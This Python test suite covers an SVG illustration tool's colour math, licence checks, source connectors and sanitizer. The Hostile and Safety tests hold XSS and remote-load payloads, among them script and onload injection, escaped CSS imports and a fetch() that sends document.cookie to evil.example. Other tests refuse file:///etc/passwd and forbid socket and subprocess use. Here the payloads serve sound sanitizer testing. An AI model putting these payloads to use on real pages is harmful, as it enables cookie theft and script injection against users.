#!/usr/bin/env python3
"""Tests for illustrate.py. Standard library only, no network: API responses are canned in the shapes the live
APIs returned on 2026-09-28, and every SVG is a small fixture written here (no third-party art in the repo).

    python3 skills/opendesigner-illustrate/scripts/test_illustrate.py
"""
import contextlib, io, json, os, sys, tempfile, unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import illustrate as il  # noqa: E402

REPO = HERE.parents[2]
EXAMPLE_CSS = REPO / "examples" / "consumer-playful" / "build" / "css" / "tokens.css"
EXAMPLE_JSON = REPO / "examples" / "consumer-playful" / "tokens" / "primitives.tokens.json"

# An unDraw-shaped scene: one accent, gray neutrals, a skin tone, a second hue, a <style> class and a style attribute.
SCENE = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100">
<defs><style>.cls-1{fill:#e6e6e6;}</style><linearGradient id="g"><stop offset="0" stop-color="#6c63ff"/></linearGradient></defs>
<rect class="cls-1" width="200" height="100"/>
<path d="M10 10 L90 10 L90 90 L10 90 Z M20 20 L80 20 L80 80 Z" fill="#6c63ff"/>
<path d="M100 10 L190 10 L190 90 Z" fill="#6C63FF" stroke="#3f3d56"/>
<circle cx="50" cy="50" r="10" fill="#ffb8b8"/>
<rect x="60" y="60" width="20" height="10" fill="#ffffff"/>
<ellipse cx="150" cy="50" rx="10" ry="5" style="fill:#f9a826;stroke:none"/>
<path d="M0 0 L5 5" fill="url(#g)"/>
<path d="M1 1 L2 2 L3 1 Z"/>
</svg>"""

EVIL = """<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="20" onload="alert(1)">
<script>alert(1)</script><foreignObject><div>x</div></foreignObject>
<style>@import url(https://evil.example/x.css); .a{fill:url(https://evil.example/p.svg#x)}</style>
<image xlink:href="https://evil.example/track.png"/><a href="javascript:alert(1)"><rect width="5" height="5" fill="red"/></a>
<use href="#ok"/><rect id="ok" width="1" height="1"/></svg>"""


def run(argv):
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        il.main(argv)
    return buf.getvalue()


class ColorMath(unittest.TestCase):
    def test_round_trip_and_contrast(self):
        for hx in ("#6c63ff", "#ff5a36", "#3f3d56", "#ffffff", "#000000", "#1f033c"):
            self.assertEqual(il.oklch_to_hex(*il.hex_to_oklch(hx)), hx)
        self.assertAlmostEqual(il.contrast("#ffffff", "#000000"), 21, places=3)

    def test_normalize_tokens(self):
        self.assertEqual(il.norm_color("#ABC"), "#aabbcc")
        self.assertEqual(il.norm_color("rgb(255, 0, 0)"), "#ff0000")
        self.assertEqual(il.norm_color("rgba(0 0 255 / 50%)"), "#0000ff")
        self.assertEqual(il.norm_color("White"), "#ffffff")
        for tok in ("none", "currentColor", "url(#g)", "inherit"):
            self.assertIsNone(il.norm_color(tok))

    def test_classify_keeps_skin_not_brand_orange(self):
        self.assertEqual(il.classify("#e6e6e6"), "neutral")
        self.assertEqual(il.classify("#3f3d56"), "neutral")
        self.assertEqual(il.classify("#ffb8b8"), "skin")
        self.assertEqual(il.classify("#a0616a"), "skin")
        self.assertEqual(il.classify("#6c63ff"), "chroma")
        self.assertEqual(il.classify("#ff5a36"), "chroma")   # saturated brand orange is not skin
        self.assertEqual(il.classify("#ffb8b8", keep_skin=False), "chroma")


class Safety(unittest.TestCase):
    def test_strips_code_and_remote_loads(self):
        root, notes = il.sanitize(EVIL)
        out = il.serialize(root)
        for bad in ("<script", "foreignObject", "onload", "evil.example", "javascript:"):
            self.assertNotIn(bad, out)
        self.assertIn('href="#ok"', out)          # local references survive
        self.assertIn('viewBox="0 0 40 20"', out)  # added from width and height
        self.assertTrue(any("removed <script>" in n for n in notes))

    def test_refuses_entities_and_non_svg(self):
        with self.assertRaises(ValueError):
            il.sanitize('<!DOCTYPE svg [<!ENTITY a "aaaa">]><svg xmlns="http://www.w3.org/2000/svg">&a;</svg>'.replace("]>", "]><!ENTITY b 'x'>"))
        with self.assertRaises(ValueError):
            il.sanitize("<html></html>")


class Hostile(unittest.TestCase):
    """Payloads from the independent review (2026-09-28): each one survived the first, deny-list sanitizer."""
    PAYLOADS = {
        "uppercase script": '<SCRIPT>alert(1)</SCRIPT>',
        "lowercase foreignobject": '<foreignobject><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/"/></foreignobject>',
        "uppercase href": '<image HREF="https://evil.example/i.png"/>',
        "html img": '<img xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/i.png"/>',
        "meta refresh": '<meta xmlns="http://www.w3.org/1999/xhtml" http-equiv="refresh" content="0;url=https://evil.example/"/>',
        "animate href": '<a><animate attributeName="href" values="java&#9;script:alert(1)"/><text>click</text></a>',
        "set href": '<image><set attributeName="href" to="https://evil.example/p.png"/></image>',
        "css import caps": '<style>@IMPORT "https://evil.example/x.css";</style>',
        "css URL caps": '<style>.a{fill:URL(https://evil.example/p.svg#x)}</style>',
        "css https caps": '<style>.a{fill:url(HTTPS://evil.example/p.svg#x)}</style>',
        "css import no semicolon": '<style>@import "https://evil.example/x.css"</style>',
        "css escaped import": '<style>@\\69mport "https://evil.example/x.css";</style>',
        "css escaped url": '<style>.a{background:\\75 rl(https://evil.example/p.png)}</style>',
        "css protocol-relative": '<style>.a{fill:url(/\\/evil.example/p.svg)}</style>',
        "css image-set": '<style>.a{background:image-set("https://evil.example/p.png" 1x)}</style>',
        "css after child": '<style><x/>.a{fill:url(https://evil.example/p.svg)}</style>',
        "style attr url": '<rect style="fill:url(https://evil.example/p.svg#x)"/>',
        "data html href": '<use href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"/>',
        "namespaced script": '<x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script>',
    }

    def test_nothing_hostile_survives(self):
        for name, body in self.PAYLOADS.items():
            with self.subTest(name):
                svg = f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">{body}<rect width="1" height="1" fill="#ff0000"/></svg>'
                out = il.serialize(il.sanitize(svg)[0]).lower()
                for bad in ("script", "evil.example", "iframe", "<img", "<meta", "animate", "<set", "@import", "image-set", "\\"):
                    self.assertNotIn(bad, out, f"{name}: {bad!r} survived")

    def test_jsx_text_cannot_run(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Path(tmp) / "x.svg"
            f.write_text('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><desc>{fetch("https://evil.example/?c="+document.cookie)}</desc><rect width="5" height="5" fill="#6c63ff"/></svg>')
            run(["--dir", tmp, "add", str(f), "--source", "other", "--licence", "CC0", "--name", "x"])
            run(["--dir", tmp, "recolor", "x", "--tokens", str(EXAMPLE_CSS), "--variants", "themed"])
            run(["--dir", tmp, "apply", "x", "--to", str(Path(tmp) / "out"), "--as", "react"])
            tsx = (Path(tmp) / "out" / "XIllustration.tsx").read_text()
            self.assertIn("{'{'}fetch(", tsx)
            self.assertNotIn("<desc>{fetch", tsx)

    def test_only_https_is_offered(self):
        with self.assertRaises(ValueError):
            il.fetch_line("file:///etc/passwd", "x.svg")
        self.assertIn('"https://a.example/x.svg"', il.fetch_line("https://a.example/x.svg", "x.svg"))

    def test_network_stays_in_one_https_function(self):
        # the owner allowed this skill the network (2026-09-28), confined to http_get: HTTPS only, 3 MB cap
        src = (HERE / "illustrate.py").read_text()
        self.assertEqual(src.count("urlopen("), 1)
        self.assertIn("def http_get(", src.split("urlopen(")[0].rsplit("\ndef ", 1)[-1].join(["\ndef ", ""]))
        for bad in ("import socket", "http.client", "import requests", "import httpx", "subprocess", "os.system"):
            self.assertNotIn(bad, src)
        with tempfile.TemporaryDirectory() as tmp:
            for url in ("http://a.example/x.svg", "file:///etc/passwd", "ftp://a.example/x"):
                with self.assertRaises(ValueError):
                    il.http_get(url, Path(tmp) / "x")

    def test_http_get_refuses_downgrade_and_oversize(self):
        class Resp:
            def __init__(self, url, body): self.url, self.body = url, body
            def geturl(self): return self.url
            def read(self, n): return self.body[:n]
            def __enter__(self): return self
            def __exit__(self, *a): return False
        with tempfile.TemporaryDirectory() as tmp:
            dest = Path(tmp) / "x.svg"
            with mock.patch.object(il.urllib.request, "urlopen", return_value=Resp("http://a.example/x.svg", b"<svg/>")):
                with self.assertRaises(ValueError):
                    il.http_get("https://a.example/x.svg", dest)
            with mock.patch.object(il.urllib.request, "urlopen", return_value=Resp("https://a.example/x.svg", b"x" * (il.MAX_BYTES + 5))):
                with self.assertRaises(ValueError):
                    il.http_get("https://a.example/x.svg", dest)
            self.assertFalse(dest.exists())
            with mock.patch.object(il.urllib.request, "urlopen", return_value=Resp("https://a.example/x.svg", b"<svg/>")):
                il.http_get("https://a.example/x.svg", dest)
            self.assertEqual(dest.read_bytes(), b"<svg/>")


class Recolor(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.pal = il.load_palette(tokens=EXAMPLE_CSS)

    def test_palette_from_css_and_json_agree(self):
        pal_json = il.load_palette(tokens=EXAMPLE_JSON)
        self.assertEqual(self.pal["prefix"], "--ds-color-")
        for ramp in ("neutral", "accent", "accent2"):
            self.assertEqual(len(self.pal["light"][ramp]), 12)
            self.assertEqual(self.pal["light"][ramp], pal_json["light"][ramp])
            self.assertEqual(self.pal["dark"][ramp], pal_json["dark"][ramp])

    def test_seed_palette_without_tokens(self):
        pal = il.load_palette(accent="#2563eb")
        self.assertEqual(sorted(pal["light"]), ["accent", "neutral"])
        self.assertEqual(pal["light"]["accent"][9], "#2563eb")
        self.assertGreater(il.hex_to_oklch(pal["light"]["neutral"][1])[0], il.hex_to_oklch(pal["light"]["neutral"][12])[0])
        self.assertLess(il.hex_to_oklch(pal["dark"]["neutral"][1])[0], il.hex_to_oklch(pal["dark"]["neutral"][12])[0])

    def test_census_reads_every_place_color_lives(self):
        root, _ = il.sanitize(SCENE)
        w, implicit = il.census(root)
        for hx in ("#e6e6e6", "#6c63ff", "#3f3d56", "#ffb8b8", "#f9a826"):
            self.assertIn(hx, w)
        self.assertGreater(implicit, 0)                  # the last path has no fill: it paints black
        self.assertGreater(w["#6c63ff"], w["#ffb8b8"])   # long path data weighs more than a small circle

    def test_mapping_roles(self):
        root, _ = il.sanitize(SCENE)
        m = il.plan_mapping(il.census(root)[0], self.pal)
        self.assertEqual(m["#6c63ff"][0], "accent")      # the heaviest hue takes the brand accent
        self.assertEqual(m["#f9a826"][0], "accent2")
        self.assertEqual(m["#e6e6e6"][0], "neutral")
        self.assertEqual(m["#ffb8b8"], ("keep", "#ffb8b8"))
        self.assertGreater(m["#3f3d56"][1], 9)           # dark ink lands on a dark step
        self.assertLess(m["#e6e6e6"][1], 7)              # pale fill lands on a pale step
        forced = il.plan_mapping(il.census(root)[0], self.pal, overrides={"#6c63ff": "accent3-9", "#f9a826": "#123456"})
        self.assertEqual(forced["#6c63ff"], ("accent3", 9))
        self.assertEqual(forced["#f9a826"], ("keep", "#123456"))

    def test_variants_use_only_palette_colors(self):
        out, mapping, weights, css = il.recolor_svg(SCENE, self.pal)
        self.assertEqual(set(out), set(il.VARIANTS))
        light = {hx for steps in self.pal["light"].values() for hx in steps.values()}
        dark = {hx for steps in self.pal["dark"].values() for hx in steps.values()}
        for v, allowed in (("light", light), ("dark", dark), ("tint", light), ("swap", light), ("mono", light)):
            w, _ = il.census(il.sanitize(out[v])[0])
            extra = {hx for hx in w if hx not in allowed} - ({"#ffb8b8"} if v != "mono" else set())
            self.assertFalse(extra, f"{v} has off-palette colors {extra}")
        self.assertNotIn("#6c63ff", out["light"].lower())
        mono_w, _ = il.census(il.sanitize(out["mono"])[0])
        self.assertTrue(all(il.classify(hx, keep_skin=False) == "neutral" for hx in mono_w))
        self.assertIn('stop-color', out["light"])      # gradients are recolored too

    def test_dark_lifts_the_palest_neutrals_off_the_page(self):
        out, mapping, _, _ = il.recolor_svg(SCENE, self.pal, variants=("dark",))
        step = mapping["#ffffff"][1]
        self.assertLessEqual(step, 3)
        self.assertIn(self.pal["dark"]["neutral"][step + 2], out["dark"])
        self.assertNotIn(self.pal["dark"]["neutral"][1] + ";", out["dark"])

    def test_themed_variant_follows_the_theme(self):
        out, mapping, _, css = il.recolor_svg(SCENE, self.pal, variants=("themed",))
        svg = out["themed"]
        self.assertIn("var(--od-illus-accent-", svg)
        self.assertNotIn(' fill="var(', svg)          # var() only inside style, where browsers accept it
        self.assertIn('--od-illus-accent-%d: var(--ds-color-accent-light-%d)' % ((mapping["#6c63ff"][1],) * 2), css)
        self.assertIn('--ds-color-accent-dark-', css)
        self.assertIn('prefers-color-scheme: dark', css)
        self.assertIn(".cls-1{fill:var(--od-illus-neutral-", svg)

    def test_gradient_ids_that_look_like_hex_are_kept(self):
        svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><defs><linearGradient id="face"><stop stop-color="#6c63ff"/></linearGradient></defs><rect width="9" height="9" fill="url(#face)"/><rect width="2" height="2" style="fill:url(#face)"/></svg>'
        out, *_ = il.recolor_svg(svg, self.pal)
        for v in ("light", "themed"):
            self.assertEqual(out[v].count("url(#face)"), 2, v)

    def test_transparency_is_kept(self):
        svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><ellipse rx="5" ry="1" fill="rgba(0,0,0,0.2)"/><rect width="2" height="2" fill="#00000080"/></svg>'
        out, *_ = il.recolor_svg(svg, self.pal)
        dark_ink = self.pal["light"]["neutral"][12]
        self.assertIn(dark_ink + "33", out["light"])
        self.assertIn(dark_ink + "80", out["light"])
        self.assertIn("color-mix(in srgb, var(--od-illus-neutral-12", out["themed"])

    def test_themed_keeps_the_cascade(self):
        # a class rule beats a fill attribute; the themed variant must draw the same shape the same way
        svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><style>.a{fill:#f9a826}</style><path class="a" d="M0 0h9v9z" fill="#000"/></svg>'
        out, *_ = il.recolor_svg(svg, self.pal)
        self.assertIn(":where(.odp1){fill:var(--od-illus-neutral-12", out["themed"])
        self.assertNotIn('style="fill', out["themed"])

    def test_style_metrics(self):
        m = il.style_metrics(SCENE)
        self.assertEqual(m["aspect"], 2.0)
        self.assertEqual(m["text"], 0)
        self.assertGreaterEqual(m["hues"], 2)


class Licences(unittest.TestCase):
    def setUp(self):
        self.sources = {s["id"]: s for s in il.load_json(il.SOURCES)["sources"]}

    def v(self, **c):
        return il.licence_verdict({"source": "openverse", **c}, self.sources)[0]

    def test_item_licences(self):
        self.assertEqual(self.v(licence="CC0"), "ok")
        self.assertEqual(self.v(licence="Public domain mark"), "ok")
        self.assertEqual(self.v(licence="CC BY 4.0"), "attribution")
        self.assertEqual(self.v(licence="CC BY-SA 3.0"), "attribution")
        self.assertEqual(self.v(licence="CC BY-NC 4.0"), "blocked")
        self.assertEqual(self.v(licence="CC BY-ND 4.0"), "blocked")
        self.assertEqual(self.v(licence=""), "blocked")

    def test_words_are_not_mistaken_for_licence_codes(self):
        # "LICENCE" contains "NC" and "SA" could hide in words; only whole codes count
        self.assertEqual(il.licence_verdict({"source": "lukaszadam", "licence": "CC0 (site: 'CC0 licence (MIT licence)')"}, self.sources)[0], "ok")

    def test_source_terms(self):
        lv = lambda sid, **c: il.licence_verdict({"source": sid, "licence": self.sources[sid]["licence"], **c}, self.sources)[0]
        self.assertEqual(lv("undraw"), "ok")
        self.assertEqual(lv("storyset"), "attribution")
        self.assertEqual(lv("iradesign"), "attribution")
        self.assertEqual(lv("iconify", licence_spdx="MIT"), "ok")
        self.assertEqual(lv("iconify", licence_spdx="CC-BY-4.0"), "attribution")
        self.assertEqual(lv("iconify", licence_spdx="GPL-3.0"), "blocked")

    def test_manual_sources_are_never_automated(self):
        for sid in ("undraw", "storyset", "manypixels", "blush", "svgrepo"):
            self.assertEqual(self.sources[sid]["access"], "manual", sid)
            self.assertNotIn(sid, il.CONNECTORS)
        for s in self.sources.values():
            self.assertIn("restrictions", s)
            if s["id"] != "other":
                self.assertTrue(s["licence_url"].startswith("https://"), s["id"])


class Directory(unittest.TestCase):
    def setUp(self):
        self.data = il.load_json(il.SOURCES)

    def test_every_source_is_complete(self):
        ids = [s["id"] for s in self.data["sources"]]
        self.assertEqual(len(ids), len(set(ids)))
        for s in self.data["sources"]:
            with self.subTest(s["id"]):
                self.assertIn(s["access"], il.ACCESS)
                self.assertIn(s.get("attribution"), il.CREDIT)
                if s["id"] == "other":
                    continue
                for k in ("name", "url", "licence", "licence_url", "style", "kind", "formats", "evidence"):
                    self.assertTrue(s.get(k), f"missing {k}")
                self.assertTrue(set(s["kind"]) <= set(il.KINDS), s["kind"])
                self.assertTrue(s["licence_url"].startswith("https://"))
                if s["access"] == "api":
                    self.assertIn(s["id"], il.CONNECTORS)
                else:
                    self.assertTrue(s.get("search_url"), "people need a link to start from")
                    self.assertTrue(s.get("navigate"), "steps for the agent or the person")
        for e in self.data["excluded"]:
            self.assertTrue(e["why"])

    def test_directory_markdown_is_current(self):
        md = il.REF / "directory.md"
        self.assertEqual(md.read_text(encoding="utf-8"), il.directory_markdown(self.data) + "\n",
                         "edit synthesis/illustration-sources.json, then run: python3 tools/build_data.py")

    def test_directory_page_and_filters(self):
        page = il.directory_html(self.data)
        self.assertIn("Illustration directory", page)
        self.assertNotIn("</script><", page.split('id="data">', 1)[1].split("</script>", 1)[0] + "x")  # data cannot close its tag
        with tempfile.TemporaryDirectory() as tmp:
            run(["--dir", tmp, "directory"])
            self.assertTrue((Path(tmp) / "directory.html").exists())
        out = run(["sources", "--kind", "people", "--no-credit", "--q", "team"])
        self.assertIn("openpeeps", out)
        self.assertIn("https://www.openpeeps.com", out)
        self.assertNotIn("storyset", out)             # credit required
        self.assertIn("undraw.co/search/team", run(["sources", "--q", "team"]))

    def test_no_tier_that_forbids_changes_can_be_recolored(self):
        sources = {s["id"]: s for s in self.data["sources"]}
        self.assertEqual(il.licence_verdict({"source": "icons8", "licence": sources["icons8"]["licence"]}, sources)[0], "blocked")


OPENVERSE = {"result_count": 1, "results": [{"id": "abc", "title": "Rocket launch", "url": "https://upload.wikimedia.org/r.svg",
             "foreign_landing_url": "https://commons.wikimedia.org/wiki/File:R.svg", "creator": "Ann", "creator_url": "",
             "license": "by-sa", "license_version": "4.0", "license_url": "https://creativecommons.org/licenses/by-sa/4.0/",
             "provider": "wikimedia", "filetype": "svg", "tags": [{"name": "space"}], "attribution": "\"Rocket launch\" by Ann is licensed under CC BY-SA 4.0.",
             "thumbnail": "https://api.openverse.org/v1/images/abc/thumb/"}]}
COMMONS = {"query": {"pages": [{"pageid": 7, "title": "File:Empty_inbox.svg", "imageinfo": [{"url": "https://upload.wikimedia.org/e.svg",
           "descriptionurl": "https://commons.wikimedia.org/wiki/File:Empty_inbox.svg", "mime": "image/svg+xml",
           "extmetadata": {"LicenseShortName": {"value": "CC0"}, "Artist": {"value": "<a href='x'>Bo</a>"}, "AttributionRequired": {"value": "false"}}}]},
           {"pageid": 8, "title": "File:Photo.jpg", "imageinfo": [{"mime": "image/jpeg"}]}]}}
ICONIFY = {"icons": ["fluent-emoji-flat:rocket", "mdi:rocket"], "collections": {
           "fluent-emoji-flat": {"name": "Fluent Emoji Flat", "author": {"name": "Microsoft"}, "license": {"title": "MIT", "spdx": "MIT"}},
           "mdi": {"name": "Material Design Icons", "license": {"title": "Apache 2.0", "spdx": "Apache-2.0"}}}}
LISTING = '<img src="/images/free-illustrations/rocket_launch.svg"><img src="/images/free-illustrations/coffee-cup.svg">'


class Connectors(unittest.TestCase):
    def setUp(self):
        self.sources = {s["id"]: s for s in il.load_json(il.SOURCES)["sources"]}

    def req(self, **kw):
        return {"url": "https://x/?tags=team", "words": [], **kw}

    def test_openverse_shape(self):
        c = il.parse_openverse(json.dumps(OPENVERSE), self.req(), self.sources["openverse"], 10)[0]
        self.assertEqual((c["id"], c["licence"], c["format"]), ("openverse:abc", "CC BY-SA 4.0", "svg"))
        self.assertIn("Ann", c["attribution"])

    def test_commons_shape_keeps_only_svg(self):
        items = il.parse_commons(json.dumps(COMMONS), self.req(), self.sources["commons"], 10)
        self.assertEqual(len(items), 1)
        self.assertEqual((items[0]["title"], items[0]["licence"], items[0]["author"]), ("Empty inbox", "CC0", "Bo"))

    def test_iconify_shape(self):
        items = il.parse_iconify(json.dumps(ICONIFY), self.req(), self.sources["iconify"], 10)
        self.assertEqual(items[0]["download"], "https://api.iconify.design/fluent-emoji-flat/rocket.svg")
        self.assertEqual(items[0]["licence_spdx"], "MIT")

    def test_listing_keeps_matches_only(self):
        items = il.parse_listing(LISTING, self.req(words=["rocket", "space"]), self.sources["lukaszadam"], 10)
        self.assertEqual([c["title"] for c in items], ["rocket launch"])
        self.assertEqual(items[0]["download"], "https://lukaszadam.com/images/free-illustrations/rocket_launch.svg")

    def test_cocomaterial_shape(self):
        body = json.dumps({"count": 1, "results": [{"id": "7", "name": "Team", "tags": "team,work", "svg": "https://cocomaterial.com/media/t.svg",
                                                    "coloredSvg": "None"}]})
        items = il.parse_cocomaterial(body, self.req(), self.sources["cocomaterial"], 10)
        self.assertEqual([(c["id"], c["licence"]) for c in items], [("cocomaterial:7", "CC0")])

    def test_requests_are_https_and_bounded(self):
        for sid, (build, _, _) in il.CONNECTORS.items():
            urls = build(self.sources[sid], ["rocket launch", "rocket"], ["rocket", "launch"], ["start"], 20)
            self.assertTrue(1 <= len(urls) <= 3, sid)
            self.assertTrue(all(u.startswith("https://") for u in urls), sid)


def fulfil_search(d, bodies):
    """Stand in for the agent: save a canned response for every request the search printed."""
    for r in json.loads(Path(d, "requests.json").read_text())["requests"]:
        Path(r["save_as"]).write_text(bodies.get(r["source"], '{"results": []}' if r["save_as"].endswith(".json") else ""))


def ov(i, title, lic):
    return {"id": i, "title": title, "url": f"https://x/{i}.svg", "foreign_landing_url": f"https://x/{i}", "license": lic,
            "license_version": "4.0", "filetype": "svg", "creator": "Ann"}


class Workflow(unittest.TestCase):
    """search -> rank -> fetch -> recolor -> apply -> ledger in a temporary project, in --offline mode: the test stands
    in for the agent, saving the responses search and fetch ask for, so nothing touches the network."""

    def test_end_to_end(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp) / "opendesigner" / "illustrations")
            out = run(["--dir", d, "search", "rocket launch", "--slot", "onboarding", "--offline"])
            self.assertIn("with your own tools", out)             # --offline only prints what to fetch
            self.assertIn('curl -sL', out)
            self.assertIn("undraw.co/search/rocket", out)        # the manual source is offered, not fetched
            self.assertFalse(Path(d, "candidates.json").exists())
            commons = {"query": {"pages": [
                {"pageid": 2, "title": "File:Rocket launch placard diagram.svg", "imageinfo": [{"url": "https://x/2.svg", "descriptionurl": "https://x/2",
                 "mime": "image/svg+xml", "extmetadata": {"LicenseShortName": {"value": "CC0"}}}]},
                {"pageid": 4, "title": "File:Coffee.svg", "imageinfo": [{"url": "https://x/4.svg", "descriptionurl": "https://x/4",
                 "mime": "image/svg+xml", "extmetadata": {"LicenseShortName": {"value": "CC0"}}}]}]}}
            fulfil_search(d, {"openverse": json.dumps({"results": [ov("1", "Rocket launch", "cc0"), ov("3", "Rocket launch", "by-nc")]}),
                              "commons": json.dumps(commons)})
            out = run(["--dir", d, "search", "rocket launch", "--slot", "onboarding"])
            self.assertIn("4 candidates", out)
            out = run(["--dir", d, "rank"])
            ranked = [l.split()[2] for l in out.splitlines() if l[:1].strip() or l.startswith(" ")][:3]
            self.assertEqual(ranked[0], "openverse:1")
            self.assertNotIn("openverse:3", out)                # non-commercial is hidden
            out = run(["--dir", d, "fetch", "openverse:1", "openverse:3", "--name", "launch", "--offline"])
            self.assertIn("skip openverse:3: non-commercial", out)
            self.assertIn('"https://x/1.svg"', out)              # step one: the download to make
            Path(d, "downloads", "openverse-1.svg").write_text(SCENE)
            out = run(["--dir", d, "fetch", "openverse:1", "--name", "launch"])
            self.assertIn("fetched launch", out)
            run(["--dir", d, "fetch", "commons:4", "--offline"])
            Path(d, "downloads", "commons-4.svg").write_text("<svg xmlns='http://www.w3.org/2000/svg'>&nbsp;</svg>")
            self.assertIn("not a usable SVG", run(["--dir", d, "fetch", "commons:4"]))
            out = run(["--dir", d, "search", "coffee", "--offline"])  # a new search starts over: old responses are cleared
            self.assertFalse(any(Path(d, "responses").iterdir()))
            out = run(["--dir", d, "recolor", "launch", "--tokens", str(EXAMPLE_CSS)])
            self.assertIn("6 variants", out)
            app = Path(tmp) / "app"
            out = run(["--dir", d, "apply", "launch", "--to", str(app / "components"), "--as", "react", "--slot", "onboarding"])
            tsx = (app / "components" / "LaunchIllustration.tsx").read_text()
            self.assertIn("export function LaunchIllustration", tsx)
            self.assertIn(":where(.il-launch) .il-launch-cls-1{", tsx)   # scoped with no added specificity
            self.assertIn("<style>{`", tsx)                                         # CSS in a template literal
            self.assertIn('className="il-launch-cls-1"', tsx)
            self.assertIn('aria-hidden="true"', tsx)
            self.assertIn("stop-color:var(--od-illus-accent-", tsx)
            self.assertTrue((app / "components" / "launch.illustration.css").exists())
            out = run(["--dir", d, "apply", "launch", "--to", str(app / "img"), "--variant", "light", "--label", "A rocket taking off"])
            svg = (app / "img" / "launch.svg").read_text()
            self.assertIn('role="img"', svg)
            self.assertIn('aria-label="A rocket taking off"', svg)
            self.assertNotIn(' width="', svg.split(">")[0])
            led = json.loads(Path(d, "ledger.json").read_text())
            self.assertEqual(led["style"]["source"], "openverse")
            self.assertEqual(led["items"][0]["status"], "chosen")
            credits = Path(d, "ATTRIBUTION.md").read_text()
            self.assertIn("launch (onboarding)", credits)
            self.assertIn("CC0", credits)
            out = run(["--dir", d, "rank"])
            self.assertIn("Style locked to openverse", out)
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf), self.assertRaises(SystemExit) as ex:
                il.main(["--dir", d, "check", str(app / "img" / "launch.svg"), "--tokens", str(EXAMPLE_CSS)])
            self.assertEqual(ex.exception.code, 0)
            self.assertTrue(buf.getvalue().startswith("ok"), buf.getvalue())

    def test_same_title_never_overwrites(self):
        with tempfile.TemporaryDirectory() as tmp:
            items = [{"id": f"openverse:{i}", "source": "openverse", "title": "Lost", "tags": [], "licence": "CC BY 4.0",
                      "author": who, "format": "svg", "download": f"https://x/{i}.svg", "page": f"https://x/{i}"} for i, who in ((1, "Alice"), (2, "Bob"))]
            Path(tmp).mkdir(exist_ok=True)
            il.Project(tmp).save(il.Project(tmp).cand, {"items": items})
            for i in (1, 2):
                Path(tmp, "downloads").mkdir(exist_ok=True)
                Path(tmp, "downloads", f"openverse-{i}.svg").write_text(SCENE)
            run(["--dir", tmp, "fetch", "openverse:1"])
            run(["--dir", tmp, "fetch", "openverse:2"])
            run(["--dir", tmp, "fetch", "openverse:1"])   # fetching again reuses its own row
            led = json.loads(Path(tmp, "ledger.json").read_text())["items"]
            self.assertEqual(sorted((e["name"], e["author"]) for e in led), [("lost", "Alice"), ("lost-2", "Bob")])

    def test_add_needs_a_licence_for_other(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Path(tmp) / "mine.svg"
            f.write_text(SCENE)
            with self.assertRaises(SystemExit):
                run(["--dir", tmp, "add", str(f), "--source", "other"])
            out = run(["--dir", tmp, "add", str(f), "--source", "undraw", "--url", "https://undraw.co/illustrations", "--title", "Launch day"])
            self.assertIn("added launch-day (ok", out)
            out = run(["--dir", tmp, "add", str(f), "--source", "other", "--licence", "Commissioned; we own copyright", "--name", "hero"])
            self.assertIn("added hero", out)

    def test_non_svg_is_kept_as_is_with_credits(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Path(tmp) / "confetti.json"
            f.write_text('{"v":"5.7.4","layers":[]}')
            out = run(["--dir", tmp, "add", str(f), "--source", "lottiefiles", "--url", "https://lottiefiles.com/free-animation/confetti"])
            self.assertIn("kept as-is", out)
            self.assertIn("cannot be recolored", run(["--dir", tmp, "recolor", "confetti", "--tokens", str(EXAMPLE_CSS)]))
            run(["--dir", tmp, "apply", "confetti", "--to", str(Path(tmp) / "app"), "--slot", "success"])
            self.assertTrue((Path(tmp) / "app" / "confetti.json").exists())
            self.assertIn("confetti (success)", Path(tmp, "ATTRIBUTION.md").read_text())
            bad = Path(tmp) / "x.exe"
            bad.write_text("x")
            with self.assertRaises(SystemExit):
                run(["--dir", tmp, "add", str(bad), "--source", "other", "--licence", "CC0"])

    def test_check_flags_text_and_off_palette(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Path(tmp) / "t.svg"
            f.write_text('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text fill="#123456">Hi</text></svg>')
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf), self.assertRaises(SystemExit):
                il.main(["check", str(f), "--tokens", str(EXAMPLE_CSS)])
            self.assertIn("<text>", buf.getvalue())
            self.assertIn("not in the palette", buf.getvalue())


if __name__ == "__main__":
    unittest.main()
